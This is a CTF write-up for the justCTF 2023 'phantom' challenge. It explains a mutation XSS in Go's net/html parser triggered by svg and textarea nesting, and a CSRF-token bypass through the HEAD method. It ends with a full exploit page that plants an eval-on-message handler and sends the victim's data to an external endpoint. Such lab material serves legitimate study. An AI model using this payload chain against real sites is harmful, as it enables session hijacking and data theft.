# Writeup for JustCTF 2023 phantom CTF challenge

phantom was a CTF challenge in justCTF 2023 that had an extremely interesting premise which included finding a mutation XSS vector in Google `net/html` HTML parsing library as well as a CSRF bypass using the `HEAD` HTTP method.

## Description

> I think our filters are unbypassable.
> * https://phantom.web.jctf.pro
> * https://s3.cdn.justctf.team/bb9f972c-9a39-46d6-ba2e-26a95e2521af/phantom.zip

## Initial recon

The zip file handout contained two files of importance, a `main.go` that was a small Go web server that allowed a user to edit their profile and view it, and a `bot.go` to allow users to test their exploits.

<details>

<summary>
main.go
</summary>

```go
package main

import (
	"bytes"
	"crypto/rand"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	recaptcha "github.com/dpapathanasiou/go-recaptcha"
	"github.com/google/uuid"
	"github.com/gorilla/csrf"
	"github.com/gorilla/mux"
	"github.com/gorilla/sessions"
	"golang.org/x/net/html"
)

func generateSecret(length int) []byte {
	token := make([]byte, length)
	_, err := rand.Read(token)
	if err != nil {
		fmt.Println(err)
		return nil
	}
	return token
}

var store = sessions.NewCookieStore(generateSecret(32))

const templateDir = "templates"

var templates = template.Must(template.ParseFiles(
	filepath.Join(templateDir, "header.html"),
	filepath.Join(templateDir, "footer.html"),
	filepath.Join(templateDir, "signup.html"),
	filepath.Join(templateDir, "login.html"),
	filepath.Join(templateDir, "profile.html"),
	filepath.Join(templateDir, "edit.html"),
	filepath.Join(templateDir, "index.html"),
	filepath.Join(templateDir, "bot.html"),
))

type User struct {
	ID          uuid.UUID
	Username    string
	Password    string
	Name        string
	Description string
}

var Users map[string]*User

func isSafeHTML(input string) bool {
	var buffer bytes.Buffer
	tokenizer := html.NewTokenizer(strings.NewReader(input))

	for {
		tt := tokenizer.Next()
		switch {
		case tt == html.ErrorToken:
			return true
		case tt == html.StartTagToken, tt == html.EndTagToken, tt == html.SelfClosingTagToken:
			token := tokenizer.Token()
			if len(token.Attr) > 0 {
				return false
			}

			switch token.Data {
			case "h1", "h2", "h3", "h4", "h5", "h6", "b", "i", "a", "img", "p", "code", "svg", "textarea":
				buffer.WriteString(token.String())
			default:
				return false
			}
		case tt == html.TextToken:
			buffer.WriteString(tokenizer.Token().String())
		default:
			return false
		}
	}
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	templates.ExecuteTemplate(w, "index", nil)
}

func signupHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		data := map[string]interface{}{
			"csrfToken": csrf.Token(r),
		}
		templates.ExecuteTemplate(w, "signup", data)
	} else if r.Method == http.MethodPost {
		username := r.FormValue("username")
		password := r.FormValue("password")
		name := r.FormValue("name")

		if _, ok := Users[username]; ok {
			http.Error(w, "Username is already taken", http.StatusConflict)
			return
		}

		Users[username] = &User{ID: uuid.New(), Username: username, Password: password, Name: name}
		http.Redirect(w, r, "/login", http.StatusFound)
	}
}

func profileHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := store.Get(r, "session")
	if auth, ok := session.Values["authenticated"].(bool); !ok || !auth {
		http.Error(w, "Forbidden", http.StatusForbidden)
		return
	}
	username := session.Values["username"].(string)
	if user, ok := Users[username]; ok {
		data := map[string]interface{}{
			"Name":        user.Name,
			"Description": template.HTML(user.Description),
		}
		templates.ExecuteTemplate(w, "profile", data)
	} else {
		http.Error(w, "Unauthenticated", http.StatusUnauthorized)
		return
	}
}

func profileEditHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		session, _ := store.Get(r, "session")
		if auth, ok := session.Values["authenticated"].(bool); !ok || !auth {
			http.Error(w, "Forbidden", http.StatusForbidden)
			return
		}
		username := session.Values["username"].(string)
		if user, ok := Users[username]; ok {
			data := map[string]interface{}{
				"User":      user,
				"csrfToken": csrf.Token(r),
			}
			templates.ExecuteTemplate(w, "edit", data)
		} else {
			http.Error(w, "Unauthenticated", http.StatusUnauthorized)
			return
		}
	} else {
		// handle file upload
		session, _ := store.Get(r, "session")
		if auth, ok := session.Values["authenticated"].(bool); !ok || !auth {
			http.Error(w, "Forbidden", http.StatusForbidden)
			return
		}
		name := r.FormValue("name")
		description := r.FormValue("description")

		username := session.Values["username"].(string)
		if user, ok := Users[username]; ok {

			if isSafeHTML(description) {
				descriptionHTML, err := html.Parse(strings.NewReader(description))
				var buf bytes.Buffer
				html.Render(&buf, descriptionHTML)

				if err != nil {
					http.Error(w, "Forbidden", http.StatusForbidden)
				}
				if len(name) > 0 {
					user.Name = name
				}
				user.Description = buf.String()

				data := map[string]interface{}{
					"Name":        user.Name,
					"Description": template.HTML(user.Description),
				}
				templates.ExecuteTemplate(w, "profile", data)
			} else {
				http.Error(w, "Forbidden", http.StatusForbidden)
				return
			}
		}
	}
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		data := map[string]interface{}{
			"csrfToken": csrf.Token(r),
		}
		templates.ExecuteTemplate(w, "login", data)
	} else if r.Method == http.MethodPost {
		username := r.FormValue("username")
		password := r.FormValue("password")
		if user, ok := Users[username]; ok {
			if user.Password == password {
				session, _ := store.Get(r, "session")
				session.Values["authenticated"] = true
				session.Values["username"] = user.Username
				session.Save(r, w)
				http.Redirect(w, r, "/profile", http.StatusFound)
				return
			} else {

			}
		} else {
			data := map[string]interface{}{
				"Error":     "Invalid username or password",
				"csrfToken": csrf.Token(r),
			}
			templates.ExecuteTemplate(w, "login", data)
		}
	}
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	session, _ := store.Get(r, "session")
	session.Values["authenticated"] = false
	session.Save(r, w)
}

func botHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodGet {
		data := map[string]interface{}{
			"csrfToken": csrf.Token(r),
		}
		templates.ExecuteTemplate(w, "bot", data)
	} else if r.Method == http.MethodPost {
		clientIP := r.RemoteAddr
		recaptchaResponse := r.FormValue("g-recaptcha-response")
		url := r.FormValue("url")
		success, err := recaptcha.Confirm(clientIP, recaptchaResponse)
		if err != nil {
			http.Error(w, "Failed to verify reCAPTCHA", http.StatusInternalServerError)
			return
		}

		if !success {
			http.Error(w, "reCAPTCHA failed", http.StatusBadRequest)
			return
		}
		cmd := exec.Command("./bot", "-url", url)
		cmd.Start()
		data := map[string]interface{}{
			"Success":   "URL has been submitted",
			"csrfToken": csrf.Token(r),
		}
		templates.ExecuteTemplate(w, "bot", data)

	}
}

func main() {
	Users = make(map[string]*User)
	recaptcha.Init(os.Getenv("GRECAPTCHA"))
	CSRF := csrf.Protect(generateSecret(32))
	store.Options = &sessions.Options{
		Path:     "/",
		MaxAge:   86400 * 7,
		HttpOnly: true,
		SameSite: http.SameSiteNoneMode,
		Secure:   true,
	}
	r := mux.NewRouter()
	r.HandleFunc("/signup", signupHandler)
	r.HandleFunc("/profile", profileHandler)
	r.HandleFunc("/profile/edit", profileEditHandler)
	r.HandleFunc("/login", loginHandler)
	r.HandleFunc("/logout", logoutHandler)
	r.HandleFunc("/bot", botHandler)
	r.HandleFunc("/", indexHandler)
	http.ListenAndServe(":8000", CSRF(r))
}
```
</details>
<details>

<summary>
bot.go
</summary>

```go
package main

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/chromedp/chromedp"
)

func generateSecretString(length int) string {
	token := make([]byte, length)
	_, err := rand.Read(token)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	return base64.StdEncoding.EncodeToString(token)
}

func main() {
	url := flag.String("url", "", "url")
	login := generateSecretString(16)
	pwd := generateSecretString(16)
	name := os.Getenv("FLAG")
	if name == "" {
		name = "testflag"
	}
	flag.Parse()
	log.Println("url:", *url)
	opts := append(chromedp.DefaultExecAllocatorOptions[:], chromedp.Flag("headless", false))
	alloCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	ctx, cancel := chromedp.NewContext(alloCtx)
	ctx, cancel = context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	err := chromedp.Run(ctx, chromedp.Tasks{
		chromedp.Navigate("https://phantom.web.jctf.pro:443/signup"),
		chromedp.WaitVisible(`form`),
		chromedp.SendKeys(`input[name="username"]`, login),
		chromedp.SendKeys(`input[name="password"]`, pwd),
		chromedp.SendKeys(`input[name="name"]`, name),
		chromedp.Submit(`form`),
		chromedp.Navigate("https://phantom.web.jctf.pro:443/login"),
		chromedp.WaitVisible(`form`),
		chromedp.SendKeys(`input[name="username"]`, login),
		chromedp.SendKeys(`input[name="password"]`, pwd),
		chromedp.Submit(`form`),
		chromedp.Sleep(500 * time.Second),
		chromedp.Navigate(*url),
		chromedp.Sleep(5 * time.Second),
	})

	if err != nil {
		log.Fatal(err)
	}
}

```
</details>

On a initial look at `main.go`'s source code, I saw the following function which checks if the input given is safe HTML or not. Specifically it makes sure that all elements inside the input string are from a extremely strict set of  HTML elements (namely `h1`, `h2`, `h3`, `h4`, `h5`, `h6`, `b`, `i`, `a`, `img`, `p`, `code`, `svg`, `textarea`) and that there are no extraneous HTML attributes for each element.

```go
func isSafeHTML(input string) bool {
	var buffer bytes.Buffer
	tokenizer := html.NewTokenizer(strings.NewReader(input))

	for {
		tt := tokenizer.Next()
		switch {
		case tt == html.ErrorToken:
			return true
		case tt == html.StartTagToken, tt == html.EndTagToken, tt == html.SelfClosingTagToken:
			token := tokenizer.Token()
			if len(token.Attr) > 0 {
				return false
			}

			switch token.Data {
			case "h1", "h2", "h3", "h4", "h5", "h6", "b", "i", "a", "img", "p", "code", "svg", "textarea":
				buffer.WriteString(token.String())
			default:
				return false
			}
		case tt == html.TextToken:
			buffer.WriteString(tokenizer.Token().String())
		default:
			return false
		}
	}
}
```

Based on reading the rest of the code, we see the following place where the function is used:

```go
if isSafeHTML(description) {
    descriptionHTML, err := html.Parse(strings.NewReader(description))
    var buf bytes.Buffer
    html.Render(&buf, descriptionHTML)

    if err != nil {
        http.Error(w, "Forbidden", http.StatusForbidden)
    }
    if len(name) > 0 {
        user.Name = name
    }
    user.Description = buf.String()

    data := map[string]interface{}{
        "Name":        user.Name,
        "Description": template.HTML(user.Description),
    }
    templates.ExecuteTemplate(w, "profile", data)
} else {
    http.Error(w, "Forbidden", http.StatusForbidden)
    return
}
```

based on this it was obvious to me that we need to bypass the `isSafeHTML()` and get XSS in the description field to solve the challenge.

## Inital tries

At first, I tried to see if there was some easy way to gain XSS. However, based on some tests and a quick look through the DOMPurify allowed elements list there did not seem to be any obvious issues with the elements that were being allowed. I tried checking if the `<svg>`, `<textarea>` or the `<img>` element had some hidden attributes that golang `net/html` library wouldn't be able to parse, but the documentation did not reveal anything particularly incriminating. It seemed like that the error that we were supposed to exploit was probably somewhere inside the golang HTML parser.

## Going to war with the `net/html` HTML parser

Once I realized this was probably a parsing bug, I created a quick and dirty testing setup mimicking the server source provided.

```go
a := `...`
htmlTokenizer := html.NewTokenizer(strings.NewReader(a))
for {
    tokenType := htmlTokenizer.Next()
    if tokenType == html.ErrorToken {
        break
    }
    token := htmlTokenizer.Token()
    output += token.String()
    fmt.Println(token.String())
    fmt.Println("------------------")
}
op, err := html.Parse(strings.NewReader(a))
if err != nil {
    panic(err)
}
var buf bytes.Buffer
html.Render(&buf, op)
fmt.Println(buf.String())
```
After a bunch of tests, randomizing the order of elements, one specific parsing quirk stood out to me. When golang parses the following input `<textarea><img></textarea>`, it does not consider the `<img>` text as a image tag, but rather it escapes out the text and considers it raw text inside the `<textarea>` and the output from our parser is `<html><head></head><body><textarea>&lt;img&gt;</textarea></body></html>`. Based on a quick look at how other browser handled this case, however, this behaviour seemed to be normal and expected.

After some more finagling around, I hit upon the idea of smuggling the textarea tag as part of a different tag. For example, what would happen if we passed `<textarea><img src="</textarea>">` to the parser. To my surprise this seemed to handled well by the golang parser. It spat out the following output `<html><head></head><body><textarea>&lt;img src=&#34;</textarea>&#34;&gt;</body></html>`, which would be the expected behaviour according to most browsers as well. Despite multiple attempts I was not able to get any variation of this to work :(

At this point, I was a bit disappointed that my lede of using the `<textarea>` tag had not led to much and since it was getting fairly late (> 3:00) I decided to give it a good nights sleep.

## Back to war

In the morning, with 8 hours to go for the end of the CTF, I decided to take another stab at the challenge before the writeups came out. One thing I realized was that the Golang `net/html` library was open-source, so I could possibly look at the source of how they were parsing the input and be able to craft exploit ideas from there.

After spending a considerable time reading through the golang source code, I saw the following piece of code at [`parse.go:2214`](https://cs.opensource.google/go/x/net/+/refs/heads/master:html/parse.go;l=2214;drc=c63010009c802314a29324ce49987897f9838e29;bpv=0;bpt=1):

```go
switch current.Namespace {
case "math":
    adjustAttributeNames(p.tok.Attr, mathMLAttributeAdjustments)
case "svg":
    // Adjust SVG tag names. The tokenizer lower-cases tag names, but
    // SVG wants e.g. "foreignObject" with a capital second "O".
    if x := svgTagNameAdjustments[p.tok.Data]; x != "" {
        p.tok.DataAtom = a.Lookup([]byte(x))
        p.tok.Data = x
    }
    adjustAttributeNames(p.tok.Attr, svgAttributeAdjustments)
default:
    panic("html: bad parser state: unexpected namespace")
}
adjustForeignAttributes(p.tok.Attr)
namespace := current.Namespace
p.addElement()
p.top().Namespace = namespace
if namespace != "" {
    // Don't let the tokenizer go into raw text mode in foreign content
    // (e.g. in an SVG <title> tag).
    p.tokenizer.NextIsNotRawText()
}
```
this seemed interesting since by a very cursory reading the code appears to be checking if a `<math>` or a `<svg>` tag is encountered and if one such tag is encountered, we call `p.tokenizer.NextIsNotRawText()` which disables the raw text behaviour that I had found earlier untill the next `<svg>` or `<math>` tag. Digging even further, I realized that this "not raw text" behaviour only applied to `html.Parse()` and not to the tokenizer, which would still see the text as raw text. Upon testing, my hypothesis was confirmed, when I passed the following text `<svg><textarea><a></textarea>` to my program it gave the following output.

```
<svg>
------------------
<textarea>
------------------
&lt;a&gt;
------------------
</textarea>
------------------
<html><head></head><body><svg><textarea><a></a></textarea></svg></body></html>
```

In this case, the tokenizer saw four tokens and three tags, the `<svg>` tag, the `<textarea>` tag, `&lt;a&gt;` token which was the raw text inside the textarea and `</textarea>` which was the closing tag. The parser on the other hand also saw four tokens, but it had parsed inside the third token and found the `<a>` tag and considered it a seperate entity.

## The final piece: `reconstructActiveFormattingElements()`

However, even my PoC above was not sufficient enough to get XSS. We were still inside the SVG element and thus the `<a>` was not being picked up by the browser as a anchor tag :(. However, while I was testing different elements and specific configurations, I found that the `<img>` tag was transported outside of the scope `<textarea><svg>` tags while parsing. This allowed me to build the following payload `<svg><textarea><img src="x" onerror="onmessage = (e) => eval(e.data)"></textarea></svg>` which was parsed as:

```
<svg>
------------------
<textarea>
------------------
&lt;img src=&#34;x&#34; onerror=&#34;onmessage = (e) =&gt; eval(e.data)&#34;&gt;
------------------
</textarea>
------------------
</svg>
------------------
<html><head></head><body><svg><textarea></textarea></svg><img src="x" onerror="onmessage = (e) =&gt; eval(e.data)"/></body></html>
```

While I did not figure out why this was caused during the solving period (as I mentioned I had only 8 hours left), after I had solved I decided to go back and look at the golang source trying to decipher why this behaviour occurs. After a bit of digging around, I found [`parse.go:390`](https://cs.opensource.google/go/x/net/+/refs/heads/master:html/parse.go;l=390;drc=c63010009c802314a29324ce49987897f9838e29;bpv=0;bpt=1):

```go
// Section 12.2.4.3.
func (p *parser) reconstructActiveFormattingElements() {
	n := p.afe.top()
	if n == nil {
		return
	}
	if n.Type == scopeMarkerNode || p.oe.index(n) != -1 {
		return
	}
	i := len(p.afe) - 1
	for n.Type != scopeMarkerNode && p.oe.index(n) == -1 {
		if i == 0 {
			i = -1
			break
		}
		i--
		n = p.afe[i]
	}
	for {
		i++
		clone := p.afe[i].clone()
		p.addChild(clone)
		p.afe[i] = clone
		if i == len(p.afe)-1 {
			break
		}
	}
}
```

which was being called in [`parse.go:1027`](https://cs.opensource.google/go/x/net/+/master:html/parse.go;l=1027;bpv=0;bpt=1)

```go
case a.Area, a.Br, a.Embed, a.Img, a.Input, a.Keygen, a.Wbr:
    p.reconstructActiveFormattingElements()
    p.addElement()
    p.oe.pop()
    p.acknowledgeSelfClosingTag()
    if p.tok.DataAtom == a.Input {
        for _, t := range p.tok.Attr {
            if t.Key == "type" {
                if strings.ToLower(t.Val) == "hidden" {
                    // Skip setting framesetOK = false
                    return true
                }
            }
        }
    }
    p.framesetOK = false
```

This made sense since the piece of code was checking if a image tag, a area tag etc was present and if so was cloning the element, closing all scoped tags and then appending our element to the end. This was as per the behaviour defined in [Section 12.2.3.3](https://wicg.github.io/controls-list/html-output/multipage/syntax.html#list-of-active-formatting-elements) (the comment in the code is probably out of date) of the HTML standard, however, it seems like it was intended to be used for svg elements.

## The CSRF

Once I figured out the XSS most of the rest of the challenge seemed easy. I had to use a CSRF attack to modify the description field and subsequently render the page in a iframe to exfiltrate the name of the admin which was the flag. However, one last hurdle remained. The web server used CSRF token which made the CSRF attack fail every time I tried it.

The webpage was protected by Gorilla CSRF tokens, a project that seems to be defunct since Dec 2022. After looking through the code of the project I saw the following:


```go
var (
	// The name value used in form fields.
	fieldName = tokenKey
	// defaultAge sets the default MaxAge for cookies.
	defaultAge = 3600 * 12
	// The default HTTP request header to inspect
	headerName = "X-CSRF-Token"
	// Idempotent (safe) methods as defined by RFC7231 section 4.2.2.
	safeMethods = []string{"GET", "HEAD", "OPTIONS", "TRACE"}
)
```
. This meant that for `GET`, `HEAD`, `OPTIONS`, `TRACE` methods, gorrila CSRF would not check for the presence of CSRF tokens. On looking at the code of the challenge server, I realized that the challenge server would consider any method other than `GET` to be part of the `POST` flow:

```go
if r.Method == http.MethodGet {
    session, _ := store.Get(r, "session")
    if auth, ok := session.Values["authenticated"].(bool); !ok || !auth {
        http.Error(w, "Forbidden", http.StatusForbidden)
        return
    }
    username := session.Values["username"].(string)
    if user, ok := Users[username]; ok {
        data := map[string]interface{}{
            "User":      user,
            "csrfToken": csrf.Token(r),
        }
        templates.ExecuteTemplate(w, "edit", data)
    } else {
        http.Error(w, "Unauthenticated", http.StatusUnauthorized)
        return
    }
} else {
    // .... vulnerable code
}
```

after a bit of trial and error, I was able to use the `HEAD` method to reach the `POST` control flow and was able to perform XSS.

The final exploit code that I hosted on a server and sent to the bot was as follows:

<details>
<summary>hack.html</summary>

```html
<body>
<iframe src="" name="_window" style="display: none;"></iframe>
</body>
<script>
    window.addEventListener( 'load', async () => {
        const uri = `https://phantom.web.jctf.pro`;
        fetch( 'https://endpoint/started', { mode: 'no-cors' } );
        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        const payload = `<svg><textarea><img src="x" onerror="onmessage = (e) => eval(e.data)"></textarea></svg>`;
        try{
            await fetch(`${uri}/profile/edit?name=&description=${encodeURI(payload)}&gorilla.csrf.Token=`, {
                method: 'HEAD',
                credentials: 'include'
            });
        }catch(e){
            console.log(e);
        }
        const iframe = document.createElement('iframe');
        await sleep(100);
        iframe.src = `${uri}/profile`;
        iframe.onload = () => {
            fetch( 'https://endpoint/load', { mode: 'no-cors' } );
        };
        document.body.appendChild(iframe);
        await sleep(1000);
        iframe.contentWindow.postMessage('var n = document.getElementById("name").innerText;location.href = "https:/endpoint/?name=" + n', '*');
    });
</script>
```
</details>

## Flag

```
justCTF{why_on_earth_does_my_app_handle_HEADs}
```